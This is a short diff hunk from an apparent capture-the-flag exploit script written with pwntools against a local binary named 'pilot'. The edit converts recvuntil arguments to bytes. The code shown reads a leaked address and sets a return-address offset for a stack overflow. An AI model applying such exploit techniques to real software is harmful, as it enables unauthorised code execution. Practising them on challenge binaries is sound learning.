@@ -59,13 +59,13 @@ context.log_level = "debug"
 io = process("./pilot")
 
 # Receive lines until the leaked address
-io.recvuntil("[*]Location:")
+io.recvuntil(b"[*]Location:")
 
 # Grab the address
 addr = io.recvline().strip(b'\n')
 
 # Receive lines until the user input is required
-io.recvuntil("[*]Command:")
+io.recvuntil(b"[*]Command:")
 
 # Set the offset to the return address
 offset = 40
